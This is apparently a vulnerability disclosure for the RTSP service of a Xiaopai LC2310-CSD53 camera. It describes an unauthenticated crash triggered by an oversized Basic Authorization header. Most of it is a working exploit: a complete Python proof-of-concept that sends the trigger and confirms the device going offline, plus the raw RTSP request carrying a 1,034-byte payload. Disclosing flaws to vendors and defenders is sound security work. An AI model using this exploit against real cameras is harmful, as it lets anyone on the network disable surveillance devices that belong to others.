# Xiaopai LC2310-CSD53 - Unauthenticated RTSP Device Crash via Oversized Basic Authorization

### Information

Vendor: Shenzhen Xiaopai Technology Co., Ltd. (Xiaopai)

Affected Product: LC2310-CSD53

Affected Firmware Version: 1.00.18

Vendor Homepage: [https://www.xiaopaitech.com](https://www.xiaopaitech.com)

Vendor Contact Information: 0755-86566780 / 400-822-1116 (official support phone)

![Vendor contact information](images/00_vendor_contact.png)

Affected Component: RTSP service (TCP/554)

### Description

A vulnerability in the RTSP service of Xiaopai LC2310-CSD53 firmware 1.00.18 allows an unauthenticated attacker to cause a denial of service. A crafted DESCRIBE request with an oversized Authorization header using the Basic scheme is answered with 401 Unauthorized, after which the RTSP service stops accepting connections and the device becomes unreachable over ICMP, causing a device-wide denial of service (crash/reboot). The issue was reproduced with Basic values ranging from 1,000 to 10,000 bytes; a 16-byte control did not affect RTSP or ICMP availability.

### Exploit Demo

The RTSP service uses Digest authentication (realm `zlmeida`) on TCP/554. The attack does not require credentials. The PoC sends `OPTIONS`, an unauthenticated `DESCRIBE`, and a second `DESCRIBE` carrying a 1,034-byte `Authorization: Basic` value. The malformed request is answered with `401 Unauthorized`, after which the device becomes unavailable.

The terminal output shows the three requests, the oversized Basic value, and the device becoming unavailable: RTSP first returns reset/refused, then ICMP stops replying, and the script reports `Device crash observed.`:

![PoC terminal output](./images/01_poc_terminal.png)

The trigger request is defined explicitly in the PoC as `TRIGGER_DESCRIBE`, so the method, URI, CSeq and oversized header are directly visible in the code:

![Trigger request in the PoC](./images/02_trigger_code.png)

Wireshark `Follow TCP Stream` shows the complete trigger request, including the 1,034-byte `Authorization: Basic` value, and the `401 Unauthorized` response:

![Wireshark TCP stream of the trigger](./images/03_wireshark_tcp_stream.png)

The packet list shows the normal `OPTIONS 200`, the two `DESCRIBE 401` responses, and the subsequent RST/connection failures from the device:

![Wireshark packet list](./images/04_wireshark_packet_list.png)

The device indicator turns red while the terminal already reports RTSP failure and ICMP loss:

![Device indicator during the crash](./images/05_device_indicator.jpg)

The camera application reports the device as offline (`设备已离线`):

![Camera application reports the device offline](./images/06_device_app_offline.jpg)

The behavior was reproduced with multiple Basic lengths:

| Basic value | Observed result |
| --- | --- |
| 16-byte control | `401`; RTSP and ICMP remain available |
| 1,000 bytes | `401`; new RTSP connections are refused |
| 1,034 bytes | `401`; RTSP resets/refuses, then ICMP loss; device offline |
| 4,096 bytes | `401`; RTSP resets/refuses, then ICMP loss; device offline |
| 10,000 bytes | `401`; RTSP resets/refuses, then ICMP loss; device offline |

The four original fuzzer records target the same mutation point, `blocks[2].headers.Authorization`, and are treated as variants of one vulnerability. The PoC uses the 1,034-byte value as a representative stable trigger.

A 24-second screen recording of the full reproduction is provided as [07_reproduction_video.mp4](./images/07_reproduction_video.mp4). It shows the 1,034-byte Basic trigger, the RTSP and ICMP failure, and the `Device crash observed.` result.

### POC

The following standalone Python 3 PoC reproduces the representative trigger. Replace `TARGET_IP`, `USERNAME` and `PASSWORD` with the test device values. The trigger itself does not require authentication.

```python
#!/usr/bin/env python3
"""LC2310-CSD53 oversized Basic Authorization RTSP DoS PoC.

Hardcoded target: 192.168.1.100:554 (placeholder).
The script sends OPTIONS, an unauthenticated DESCRIBE, and a DESCRIBE with a
1034-byte Authorization: Basic value. It then polls RTSP and ICMP until both
become unavailable.
Run this file directly from VS Code.
"""

import socket
import subprocess
import time
from datetime import datetime

TARGET_IP = "192.168.1.100"  # replace with the target camera IP
TARGET_PORT = 554

# Not required for this unauthenticated trigger.
USERNAME = "REDACTED"  # replace with the account username
PASSWORD = "REDACTED"  # replace with the account password

BASIC_BYTES = 1034
REQUEST_INTERVAL = 1.0
PROBE_INTERVAL = 2.0
DOWN_WAIT = 30.0
USER_AGENT = "LC2310-Basic-crash-check/1.0"

BASE = "rtsp://%s:%d/md0_0" % (TARGET_IP, TARGET_PORT)

# Request 1: normal OPTIONS.
OPTIONS_REQUEST = (
    f"OPTIONS {BASE} RTSP/1.0\r\n"
    "CSeq: 2\r\n"
    f"User-Agent: {USER_AGENT}\r\n\r\n"
)

# Request 2: unauthenticated DESCRIBE, returns 401.
DESCRIBE_CHALLENGE = (
    f"DESCRIBE {BASE} RTSP/1.0\r\n"
    "CSeq: 3\r\n"
    f"User-Agent: {USER_AGENT}\r\n"
    "Accept: application/sdp\r\n\r\n"
)

# Request 3: the trigger. CSeq 4 + oversized Authorization: Basic.
TRIGGER_BASIC = "Authorization: Basic " + ("A" * BASIC_BYTES)
TRIGGER_DESCRIBE = (
    f"DESCRIBE {BASE} RTSP/1.0\r\n"
    "CSeq: 4\r\n"
    f"User-Agent: {USER_AGENT}\r\n"
    f"{TRIGGER_BASIC}\r\n"
    "Accept: application/sdp\r\n\r\n"
)

OPTIONS_PROBE = (
    f"OPTIONS {BASE} RTSP/1.0\r\n"
    "CSeq: 99\r\n"
    f"User-Agent: {USER_AGENT}\r\n\r\n"
)


def show_payload(payload):
    text = payload.decode("latin-1")
    print("  send:")
    for line in text.rstrip("\r\n").split("\r\n"):
        if line.startswith("Authorization: Basic "):
            prefix = "Authorization: Basic "
            value = line[len(prefix):]
            line = prefix + value[:32] + "... [%d-byte Basic value]" % len(value)
        elif len(line) > 120:
            line = line[:90] + "... [%d bytes total]" % len(line)
        print("    | " + line)


def read_status(stream):
    status = stream.readline()
    if not status:
        return "connection closed"
    if not status.startswith(b"RTSP/1.0 "):
        return "unexpected status line"
    headers = {}
    while True:
        line = stream.readline()
        if not line:
            return "connection closed"
        if line in (b"\r\n", b"\n"):
            break
        name, _, value = line.partition(b":")
        headers[name.lower()] = value.strip()
    length = int(headers.get(b"content-length", b"0"))
    if length:
        remaining = length
        while remaining:
            chunk = stream.read(remaining)
            if not chunk:
                break
            remaining -= len(chunk)
    return status.decode("latin-1").strip()


def send_and_read(sock, stream, label, payload):
    if isinstance(payload, str):
        payload = payload.encode("latin-1")
    print("\n[%s]" % label)
    show_payload(payload)
    time.sleep(REQUEST_INTERVAL)
    try:
        sock.sendall(payload)
        result = read_status(stream)
    except (OSError, ValueError) as exc:
        result = "%s: %s" % (type(exc).__name__, exc)
    print("  <- %s" % result)
    return result


def ping():
    try:
        result = subprocess.run(
            ["ping", "-c", "1", "-W", "1", TARGET_IP],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=2,
            check=False,
        )
        return result.returncode == 0
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return None


def probe_rtsp():
    try:
        with socket.create_connection((TARGET_IP, TARGET_PORT), timeout=1) as sock:
            sock.settimeout(1.0)
            with sock.makefile("rb") as stream:
                sock.sendall(OPTIONS_PROBE.encode("latin-1"))
                return read_status(stream)
    except ConnectionResetError:
        return "connection reset"
    except ConnectionRefusedError:
        return "connection refused"
    except socket.timeout:
        return "timeout"
    except OSError as exc:
        return type(exc).__name__


def observe():
    start = time.monotonic()
    saw_rtsp_down = False
    saw_icmp_down = False

    while True:
        elapsed = time.monotonic() - start
        rtsp = probe_rtsp()
        icmp = ping()
        icmp_text = "unavailable" if icmp is None else ("reply" if icmp else "no reply")
        print("  +%.1fs: RTSP=%s, ICMP=%s" % (elapsed, rtsp, icmp_text))

        if rtsp != "RTSP/1.0 200 OK":
            saw_rtsp_down = True
        if icmp is False:
            saw_icmp_down = True

        if saw_rtsp_down and saw_icmp_down:
            print("  RTSP and ICMP are both unavailable.")
            print("  Device crash observed.")
            break

        elapsed = time.monotonic() - start
        if elapsed >= DOWN_WAIT:
            print("  observation window ended after %.1fs" % elapsed)
            break
        time.sleep(PROBE_INTERVAL)

    print("  RTSP unavailable: %s" % saw_rtsp_down)
    print("  ICMP unavailable: %s" % saw_icmp_down)


def main():
    print("=" * 70)
    print("LC2310-CSD53 oversized Basic Authorization RTSP DoS PoC")
    print("  target: %s:%d" % (TARGET_IP, TARGET_PORT))
    print("  Basic value: %d bytes" % BASIC_BYTES)
    print("  started: %s" % datetime.now().astimezone().isoformat(timespec="seconds"))
    print("=" * 70)

    before_rtsp = probe_rtsp()
    before_icmp = ping()
    print("Preflight: RTSP=%s, ICMP=%s" % (
        before_rtsp,
        "unavailable" if before_icmp is None else ("reply" if before_icmp else "no reply")))
    if before_rtsp != "RTSP/1.0 200 OK" or before_icmp is False:
        print("Device is not healthy before the test; aborting.")
        return

    sock = socket.create_connection((TARGET_IP, TARGET_PORT), timeout=3)
    sock.settimeout(3.0)
    stream = sock.makefile("rb")
    try:
        send_and_read(sock, stream, "[1/3] OPTIONS", OPTIONS_REQUEST)
        send_and_read(sock, stream, "[2/3] DESCRIBE challenge", DESCRIBE_CHALLENGE)

        print("\n" + "=" * 70)
        print(">>> TRIGGER: [3/3] DESCRIBE with oversized Authorization: Basic <<<")
        print(">>> This is the request that crashes the device. <<<")
        print("=" * 70)
        send_and_read(sock, stream, "[3/3] TRIGGER DESCRIBE", TRIGGER_DESCRIBE)
        print("  [trigger] DESCRIBE CSeq=4, Authorization: Basic <%d bytes>" % BASIC_BYTES)
    finally:
        try:
            stream.close()
        except OSError:
            pass
        try:
            sock.close()
        except OSError:
            pass

    print("\nObserving RTSP and ICMP after the trigger ...")
    observe()


if __name__ == "__main__":
    main()

```

### MSG

The complete representative trigger is shown below. `192.168.1.100` is a placeholder for the target address. The `Authorization` value is exactly 1,034 `A` bytes and is the attack payload, not a credential. All request lines use CRLF.

```text
OPTIONS rtsp://192.168.1.100:554/md0_0 RTSP/1.0
CSeq: 2
User-Agent: LC2310-Basic-crash-check/1.0

DESCRIBE rtsp://192.168.1.100:554/md0_0 RTSP/1.0
CSeq: 3
User-Agent: LC2310-Basic-crash-check/1.0
Accept: application/sdp

DESCRIBE rtsp://192.168.1.100:554/md0_0 RTSP/1.0
CSeq: 4
User-Agent: LC2310-Basic-crash-check/1.0
Authorization: Basic AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Accept: application/sdp
```

The original fuzzer input contained later `SETUP`, `PLAY` and `TEARDOWN` requests. They are not required for the trigger and are not processed after the device becomes unavailable.

### Credit

CRfuzzer
